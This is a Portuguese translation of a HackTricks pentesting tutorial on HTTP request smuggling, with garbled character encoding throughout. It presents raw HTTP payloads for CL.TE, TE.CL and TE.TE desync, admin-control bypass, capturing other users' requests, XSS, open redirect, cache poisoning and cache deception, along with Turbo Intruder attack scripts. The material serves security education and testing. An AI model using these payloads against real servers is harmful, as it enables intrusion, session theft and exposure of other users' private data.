# HTTP Request Smuggling / Ataque de Desincroniza√ß√£o HTTP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## O que √©

Essa vulnerabilidade ocorre quando uma **desincroniza√ß√£o** entre **proxies de front-end** e o **servidor de back-end** permite que um **atacante** envie uma **requisi√ß√£o HTTP** que ser√° **interpretada** como uma **√∫nica requisi√ß√£o** pelos **proxies de front-end** (balanceadores de carga/reverse-proxy) e como **2 requisi√ß√µes** pelo **servidor de back-end**.\
Isso permite que um usu√°rio **modifique a pr√≥xima requisi√ß√£o que chega ao servidor de back-end depois da dele**.

### Teoria

[**Especifica√ß√£o RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Se uma mensagem for recebida com um campo de cabe√ßalho Transfer-Encoding e um campo de cabe√ßalho Content-Length, este √∫ltimo DEVE ser ignorado.

**Content-Length**

> O cabe√ßalho de entidade Content-Length indica o tamanho do corpo da entidade, em bytes, enviado ao destinat√°rio.

**Transfer-Encoding: chunked**

> O cabe√ßalho Transfer-Encoding especifica a forma de codifica√ß√£o usada para transferir com seguran√ßa o corpo da carga √∫til para o usu√°rio.\
> Chunked significa que dados grandes s√£o enviados em uma s√©rie de partes.

### Realidade

O **Front-End** (um balanceador de carga / Reverse Proxy) **processa** o cabe√ßalho _**content-length**_ ou o cabe√ßalho _**transfer-encoding**_ e o **servidor de Back-end** **processa o outro** provocando uma **desincroniza√ß√£o** entre os 2 sistemas.\
Isso pode ser muito cr√≠tico, pois **um atacante ser√° capaz de enviar uma requisi√ß√£o** para o proxy reverso que ser√° **interpretada** pelo servidor de **back-end como 2 requisi√ß√µes diferentes**. O **perigo** dessa t√©cnica reside no fato de que o servidor de **back-end interpretar√° a segunda requisi√ß√£o injetada** como se ela **tivesse vindo do pr√≥ximo cliente** e a **requisi√ß√£o real** desse cliente far√° **parte** da **requisi√ß√£o injetada**.

### Particularidades

Lembre-se de que no HTTP **um caractere de nova linha √© composto por 2 bytes:**

* **Content-Length**: Este cabe√ßalho usa um **n√∫mero decimal** para indicar o **n√∫mero** de **bytes** do **corpo** da requisi√ß√£o. O corpo √© esperado para terminar no √∫ltimo caractere, **uma nova linha n√£o √© necess√°ria no final da requisi√ß√£o**.
* **Transfer-Encoding:** Este cabe√ßalho usa no **corpo** um **n√∫mero hexadecimal** para indicar o **n√∫mero** de **bytes** do **pr√≥ximo chunk**. O **chunk** deve **terminar** com uma **nova linha**, mas essa nova linha **n√£o √© contada** pelo indicador de comprimento. Esse m√©todo de transfer√™ncia deve terminar com um **chunk de tamanho 0 seguido por 2 novas linhas**: `0`
* **Connection**: Com base em minha experi√™ncia, √© recomendado usar **`Connection: keep-alive`** na primeira requisi√ß√£o do Request Smuggling.

## Exemplos B√°sicos

Portanto, os ataques de request smuggling envolvem colocar tanto o cabe√ßalho `Content-Length` quanto o cabe√ßalho `Transfer-Encoding` em uma √∫nica requisi√ß√£o HTTP e manipular esses cabe√ßalhos para que os servidores de front-end e back-end processem a requisi√ß√£o de maneira diferente. A forma exata como isso √© feito depende do comportamento dos dois servidores:

* **CL.TE**: o servidor de front-end usa o cabe√ßalho `Content-Length` e o servidor de back-end usa o cabe√ßalho `Transfer-Encoding`.
* **TE.CL**: o servidor de front-end usa o cabe√ßalho `Transfer-Encoding` e o servidor de back-end usa o cabe√ßalho `Content-Length`.
* **TE.TE**: o servidor de front-end e o servidor de back-end suportam ambos o cabe√ßalho `Transfer-Encoding`, mas um dos servidores pode ser induzido a n√£o process√°-lo, obfuscando o cabe√ßalho de alguma forma.

### Vulnerabilidades CL.TE

Aqui, o servidor de front-end usa o cabe√ßalho **`Content-Length`** e o servidor de back-end usa o cabe√ßalho **`Transfer-Encoding`**. Podemos realizar um ataque simples de request smuggling da seguinte maneira:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

Observe como o `Content-Length` indica que o **corpo da requisi√ß√£o tem 30 bytes de comprimento** (_lembre-se de que o HTTP usa uma nova linha, portanto, 2 bytes para cada nova linha_), ent√£o o proxy reverso **enviar√° a requisi√ß√£o completa** para o back-end, e o back-end processar√° o cabe√ßalho `Transfer-Encoding`, deixando o `GET /404 HTTP/1.1` como o **in√≠cio da pr√≥xima requisi√ß√£o** (ali√°s, a pr√≥xima requisi√ß√£o ser√° anexada a `Foo:x<Pr√≥xima requisi√ß√£o come√ßa aqui>`).
### Vulnerabilidades TE.CL

Aqui, o servidor front-end usa o cabe√ßalho `Transfer-Encoding` e o servidor back-end usa o cabe√ßalho `Content-Length`. Podemos realizar um ataque simples de solicita√ß√£o HTTP smuggling da seguinte forma:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

Neste caso, o **reverse-proxy** ir√° **enviar a solicita√ß√£o inteira** para o **back-end** conforme indicado pelo **`Transfer-Encoding`**. No entanto, o **back-end** ir√° **processar** apenas os **`7b`** (4 bytes) conforme indicado no `Content-Length`. Portanto, a pr√≥xima solicita√ß√£o ser√° aquela que come√ßa com `GET /404 HTTP/1.1`

_Observa√ß√£o: mesmo que o ataque precise terminar com um `0`, a pr√≥xima solicita√ß√£o ser√° anexada como valores extras do par√¢metro **x**._\
_Tamb√©m observe que o Content-Length da solicita√ß√£o incorporada indicar√° o comprimento da pr√≥xima solicita√ß√£o que ser√° anexada ao par√¢metro **x**. Se for muito pequeno, apenas alguns bytes ser√£o anexados, e se for muito grande (maior que o comprimento da pr√≥xima solicita√ß√£o), um erro ser√° gerado para a pr√≥xima solicita√ß√£o._

### Vulnerabilidades TE.TE

Aqui, os servidores front-end e back-end suportam o cabe√ßalho `Transfer-Encoding`, mas um dos servidores pode ser induzido a n√£o process√°-lo, obfuscando o cabe√ßalho de alguma forma.\
Existem potencialmente infinitas maneiras de obfuscar o cabe√ßalho `Transfer-Encoding`. Por exemplo:

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

Dependendo do servidor (reverse-proxy ou back-end) que **para de processar** o cabe√ßalho **TE**, voc√™ encontrar√° uma vulnerabilidade **CL.TE** ou uma vulnerabilidade **TE.CL**.

## Encontrando HTTP Request Smuggling

### Encontrando vulnerabilidades CL.TE usando t√©cnicas de temporiza√ß√£o

Se um aplicativo for vulner√°vel √† variante CL.TE do request smuggling, o envio de uma solicita√ß√£o como a seguinte geralmente causar√° um atraso de tempo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
Uma vez que o servidor front-end usa o cabe√ßalho `Content-Length`, ele encaminhar√° apenas parte dessa solicita√ß√£o, omitindo o `0`. O servidor back-end usa o cabe√ßalho `Transfer-Encoding`, processa o primeiro fragmento e depois aguarda a chegada do pr√≥ximo fragmento. Isso causar√° um atraso percept√≠vel no tempo.

√Äs vezes, em vez de receber um tempo limite, voc√™ recebe uma resposta de erro 400 do host final, como no seguinte cen√°rio, onde um payload CL.TE √© enviado:

![](<../../.gitbook/assets/image (444).png>)

E a resposta √© um redirecionamento contendo um erro no corpo, incluindo a vers√£o do haproxy usada:

![](<../../.gitbook/assets/image (443).png>)

### Encontrando vulnerabilidades TE.CL usando t√©cnicas de temporiza√ß√£o

Se uma aplica√ß√£o for vulner√°vel √† variante TE.CL de request smuggling, enviar uma solicita√ß√£o como a seguinte geralmente causar√° um atraso no tempo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
Uma vez que o servidor front-end usa o cabe√ßalho `Transfer-Encoding`, ele encaminhar√° apenas parte dessa solicita√ß√£o, omitindo o `X`. O servidor back-end usa o cabe√ßalho `Content-Length`, espera mais conte√∫do no corpo da mensagem e aguarda a chegada do restante do conte√∫do. Isso causar√° um atraso percept√≠vel no tempo.

### Sondando vulnerabilidades de Request Smuggling HTTP

Depois de descobrir que as **t√©cnicas de temporiza√ß√£o est√£o funcionando**, voc√™ precisa **sondar** se pode **alterar as solicita√ß√µes de outros clientes**.\
A maneira mais f√°cil de fazer isso √© tentar envenenar suas pr√≥prias solicita√ß√µes, **fazendo uma solicita√ß√£o para `/` retornar um erro 404, por exemplo**.\
Nos [Exemplos B√°sicos](./#exemplos-b√°sicos) j√° vimos exemplos de `CL.TE` e `TE.CL` de como envenenar uma solicita√ß√£o de um cliente para solicitar `/404`, provocando uma resposta 404 quando o cliente estava solicitando qualquer outro recurso.

**Notas**

Algumas considera√ß√µes importantes devem ser mantidas em mente ao tentar confirmar vulnerabilidades de request smuggling por meio de interfer√™ncia em outras solicita√ß√µes:

* A solicita√ß√£o "ataque" e a solicita√ß√£o "normal" devem ser enviadas para o servidor usando conex√µes de rede diferentes. Enviar ambas as solicita√ß√µes pela mesma conex√£o n√£o comprovar√° que a vulnerabilidade existe.
* A solicita√ß√£o "ataque" e a solicita√ß√£o "normal" devem usar a mesma URL e nomes de par√¢metros, na medida do poss√≠vel. Isso ocorre porque muitos aplicativos modernos roteiam solicita√ß√µes de front-end para diferentes servidores de back-end com base na URL e nos par√¢metros. Usar a mesma URL e par√¢metros aumenta a chance de que as solicita√ß√µes sejam processadas pelo mesmo servidor de back-end, o que √© essencial para o ataque funcionar.
* Ao testar a solicita√ß√£o "normal" para detectar qualquer interfer√™ncia da solicita√ß√£o "ataque", voc√™ est√° em uma corrida com quaisquer outras solicita√ß√µes que o aplicativo esteja recebendo ao mesmo tempo, incluindo aquelas de outros usu√°rios. Voc√™ deve enviar a solicita√ß√£o "normal" imediatamente ap√≥s a solicita√ß√£o "ataque". Se o aplicativo estiver ocupado, talvez seja necess√°rio fazer v√°rias tentativas para confirmar a vulnerabilidade.
* Em alguns aplicativos, o servidor front-end funciona como um balanceador de carga e encaminha solicita√ß√µes para diferentes sistemas de back-end de acordo com algum algoritmo de balanceamento de carga. Se suas solicita√ß√µes "ataque" e "normal" forem encaminhadas para diferentes sistemas de back-end, o ataque falhar√°. Essa √© uma raz√£o adicional pela qual voc√™ pode precisar tentar v√°rias vezes antes que uma vulnerabilidade possa ser confirmada.
* Se seu ataque tiver sucesso em interferir em uma solicita√ß√£o subsequente, mas essa n√£o foi a solicita√ß√£o "normal" que voc√™ enviou para detectar a interfer√™ncia, isso significa que outro usu√°rio do aplicativo foi afetado pelo seu ataque. Se voc√™ continuar realizando o teste, isso pode ter um efeito disruptivo em outros usu√°rios e voc√™ deve ter cuidado.

### For√ßando atrav√©s de cabe√ßalhos hop-by-hop

Ao abusar dos cabe√ßalhos hop-by-hop, voc√™ pode indicar ao proxy para **excluir o cabe√ßalho Content-Length ou Transfer-Encoding, tornando poss√≠vel abusar do HTTP request smuggling**.
```
Connection: Content-Length
```
Para **mais informa√ß√µes sobre cabe√ßalhos hop-by-hop**, visite:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Abusando do HTTP Request Smuggling

### Para contornar os controles de seguran√ßa do front-end

√Äs vezes, os **proxies do front-end realizar√£o algumas verifica√ß√µes de seguran√ßa**. Voc√™ pode evit√°-las abusando do HTTP Request Smuggling, pois voc√™ ser√° capaz de **contornar as prote√ß√µes**. Por exemplo, neste exemplo voc√™ **n√£o pode acessar `/admin` de fora** e o proxy do front-end est√° verificando isso, mas este **proxy n√£o est√° verificando a solicita√ß√£o incorporada**:

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### Revelando a reescrita da solicita√ß√£o do front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Em muitas aplica√ß√µes, o **servidor do front-end realiza alguma reescrita das solicita√ß√µes** antes de encaminh√°-las para o servidor do back-end, geralmente adicionando alguns cabe√ßalhos de solicita√ß√£o adicionais.\
Uma coisa comum a se fazer √© **adicionar √† solicita√ß√£o o cabe√ßalho** `X-Forwarded-For: <IP do cliente>` ou algum cabe√ßalho semelhante para que o back-end saiba o IP do cliente.\
√Äs vezes, se voc√™ pode **encontrar quais novos valores s√£o anexados** √† solicita√ß√£o, voc√™ pode ser capaz de **contornar as prote√ß√µes** e **acessar informa√ß√µes ocultas**/**pontos de extremidade**.

Para descobrir como o proxy est√° reescrevendo a solicita√ß√£o, voc√™ precisa **encontrar um par√¢metro POST que o back-end refletir√° o valor** na resposta. Em seguida, use este par√¢metro como o √∫ltimo e use uma explora√ß√£o como esta:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

Neste caso, a pr√≥xima solicita√ß√£o ser√° anexada ap√≥s `search=`, que tamb√©m √© **o par√¢metro cujo valor ser√° refletido** na resposta, portanto, ele vai **refletir os cabe√ßalhos da pr√≥xima solicita√ß√£o**.

Observe que **apenas o comprimento indicado no cabe√ßalho `Content-Length` da solicita√ß√£o incorporada ser√° refletido**. Se voc√™ usar um n√∫mero baixo, apenas alguns bytes ser√£o refletidos, se voc√™ usar um n√∫mero maior do que o comprimento de todos os cabe√ßalhos, ent√£o a solicita√ß√£o incorporada lan√ßar√° um erro. Portanto, voc√™ deve **come√ßar** com um **n√∫mero pequeno** e **aument√°-lo** at√© ver tudo o que deseja ver.\
Observe tamb√©m que essa **t√©cnica tamb√©m √© explor√°vel com uma vulnerabilidade TE.CL**, mas a solicita√ß√£o deve terminar com `search=\r\n0`. No entanto, independentemente dos caracteres de nova linha, os valores ser√£o anexados ao par√¢metro de pesquisa.

Finalmente, observe que neste ataque ainda estamos nos atacando para aprender como o proxy do front-end est√° reescrevendo a solicita√ß√£o.

### Capturando solicita√ß√µes de outros usu√°rios <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Se voc√™ pode encontrar uma solicita√ß√£o POST que vai salvar o conte√∫do de um dos par√¢metros, voc√™ pode anexar a seguinte solicita√ß√£o como o valor desse par√¢metro para armazenar a solicita√ß√£o do pr√≥ximo cliente:

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

Neste caso, o valor do **par√¢metro comment** ser√° **salvo dentro de um coment√°rio** de uma postagem na p√°gina que est√° **dispon√≠vel publicamente**, ent√£o um **coment√°rio aparecer√° com o conte√∫do da pr√≥xima solicita√ß√£o**.

_Uma limita√ß√£o desta t√©cnica √© que geralmente ela s√≥ capturar√° dados at√© o delimitador de par√¢metro que √© aplic√°vel para a solicita√ß√£o contrabandeada. Para envios de formul√°rios codificados em URL, isso ser√° o caractere `&`, o que significa que o conte√∫do armazenado da solicita√ß√£o do usu√°rio v√≠tima terminar√° no primeiro `&`, que pode at√© mesmo aparecer na string de consulta._

Observe tamb√©m que essa **t√©cnica tamb√©m √© explor√°vel com uma vulnerabilidade TE.CL**, mas a solicita√ß√£o deve terminar com `search=\r\n0`. No entanto, independentemente dos caracteres de nova linha, os valores ser√£o anexados ao par√¢metro de pesquisa.
### Usando HTTP request smuggling para explorar XSS refletido

Se a p√°gina da web tamb√©m for **vulner√°vel a XSS refletido**, voc√™ pode abusar do HTTP Request Smuggling para atacar os clientes da web. A explora√ß√£o de XSS refletido a partir do HTTP Request Smuggling tem algumas vantagens:

* **N√£o requer intera√ß√£o com os usu√°rios v√≠timas**
* Pode ser usado para **explorar** o comportamento XSS em partes da solicita√ß√£o que **n√£o podem ser controladas facilmente em um ataque XSS refletido normal**, como os cabe√ßalhos da solicita√ß√£o HTTP.

Se um site da web for vulner√°vel a XSS refletido no cabe√ßalho User-Agent, voc√™ pode usar essa carga √∫til para explor√°-lo:

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### Usando HTTP request smuggling para transformar um redirecionamento no site em um redirecionamento aberto <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

Muitos aplicativos realizam redirecionamentos no site de uma URL para outra e colocam o nome do host do cabe√ßalho `Host` da solicita√ß√£o no URL de redirecionamento. Um exemplo disso √© o comportamento padr√£o dos servidores web Apache e IIS, onde uma solicita√ß√£o para uma pasta sem uma barra final recebe um redirecionamento para a mesma pasta incluindo a barra final:

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

Esse comportamento geralmente √© considerado inofensivo, mas pode ser explorado em um ataque de smuggling de solicita√ß√£o para redirecionar outros usu√°rios para um dom√≠nio externo. Por exemplo:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

A solicita√ß√£o smuggled ir√° acionar um redirecionamento para o site do atacante, o que afetar√° a pr√≥xima solicita√ß√£o do usu√°rio que √© processada pelo servidor back-end. Por exemplo:

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

Aqui, a solicita√ß√£o do usu√°rio era para um arquivo JavaScript que foi importado por uma p√°gina no site. O atacante pode comprometer totalmente o usu√°rio v√≠tima retornando seu pr√≥prio JavaScript na resposta.

### Usando HTTP request smuggling para realizar envenenamento de cache da web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

Se alguma parte da **infraestrutura de front-end realizar o cache de conte√∫do** (geralmente por motivos de desempenho), pode ser poss√≠vel envenenar esse cache modificando a resposta do servidor.

J√° vimos como modificar o valor esperado retornado pelo servidor para um 404 (nos [Exemplos B√°sicos](./#basic-examples)), de forma semelhante, voc√™ pode fazer o servidor retornar o conte√∫do de /index.html quando a solicita√ß√£o envenenada estiver pedindo por `/static/include.js`. Dessa forma, o conte√∫do de `/static/include.js` ser√° armazenado em cache com o conte√∫do de `/index.html`, tornando `/static/include.js` inacess√≠vel para os clientes (DoS?).

Observe que isso √© ainda mais interessante se voc√™ encontrar algum **Redirecionamento Aberto** ou algum **redirecionamento no site para redirecionamento aberto** (√∫ltima se√ß√£o). Porque voc√™ pode ser capaz de **alterar os valores de cache** de `/static/include.js` com os **valores de um script controlado por voc√™** (fazendo um **XSS geral para todos os clientes** que tentam baixar a nova vers√£o de `/static/include.js`).

Neste exemplo, ser√° mostrado como voc√™ pode explorar um **envenenamento de cache + redirecionamento no site para redirecionamento aberto** para modificar o conte√∫do do cache de `/static/include.js` para **servir c√≥digo JS controlado** pelo atacante:

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

Observe como a solicita√ß√£o incorporada est√° pedindo `/post/next?postId=3`. Essa solicita√ß√£o ser√° redirecionada para `/post?postId=4` e **usar√° o valor do cabe√ßalho Host** para indicar o dom√≠nio. Portanto, voc√™ pode **modificar o cabe√ßalho Host** para apontar para o servidor do atacante e o redirecionamento usar√° esse dom√≠nio (**redirecionamento no site para redirecionamento aberto**).

Em seguida, **ap√≥s envenenar o socket**, voc√™ precisa enviar uma solicita√ß√£o **GET** para \*\*`/static/include.js`\*\* essa solicita√ß√£o ser√° **envenenada** pela solicita√ß√£o **redirecionamento no site para redirecionamento aberto** e ir√° **capturar o conte√∫do do script controlado pelo atacante**.

Da pr√≥xima vez que algu√©m solicitar `/static/include.js`, o conte√∫do em cache do script do atacante ser√° servido (XSS geral).
### Usando o contrabando de solicita√ß√£o HTTP para realizar a decep√ß√£o do cache da web <a href="#usando-o-contrabando-de-solicita√ß√£o-http-para-realizar-a-decep√ß√£o-do-cache-da-web" id="usando-o-contrabando-de-solicita√ß√£o-http-para-realizar-a-decep√ß√£o-do-cache-da-web"></a>

> **Qual √© a diferen√ßa entre envenenamento de cache da web e decep√ß√£o de cache da web?**
>
> * No **envenenamento de cache da web**, o atacante faz com que o aplicativo armazene algum conte√∫do malicioso no cache, e esse conte√∫do √© servido do cache para outros usu√°rios do aplicativo.
> * Na **decep√ß√£o de cache da web**, o atacante faz com que o aplicativo armazene algum conte√∫do sens√≠vel pertencente a outro usu√°rio no cache, e o atacante ent√£o recupera esse conte√∫do do cache.

Nesta variante, o atacante contrabandeia uma solicita√ß√£o que retorna algum conte√∫do sens√≠vel espec√≠fico do usu√°rio. Por exemplo:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`

Se o **veneno atingir um cliente que estava acessando algum conte√∫do est√°tico** como `/someimage.png` que seria **armazenado em cache**. O conte√∫do de `/private/messages` da v√≠tima ser√° armazenado em `/someimage.png` e o atacante poder√° roub√°-lo.\
Observe que o **atacante n√£o sabe qual conte√∫do est√°tico a v√≠tima estava tentando acessar**, ent√£o provavelmente a melhor maneira de testar isso √© realizar o ataque, esperar alguns segundos e **carregar todos** os conte√∫dos est√°ticos e **procurar pelos dados privados**.

### Armando o Contrabando de Solicita√ß√£o HTTP com a Dessincroniza√ß√£o da Resposta HTTP

Voc√™ encontrou alguma vulnerabilidade de Contrabando de Solicita√ß√£o HTTP e n√£o sabe como explor√°-la. Experimente este outro m√©todo de explora√ß√£o:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts do Turbo Intruder

### CL.TE

De [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Mais informa√ß√µes

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[Imagem daqui.](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## Ferramentas

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta ferramenta √© um Fuzzer HTTP baseado em gram√°tica √∫til para encontrar discrep√¢ncias estranhas de smuggling de requisi√ß√£o.

## Refer√™ncias

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

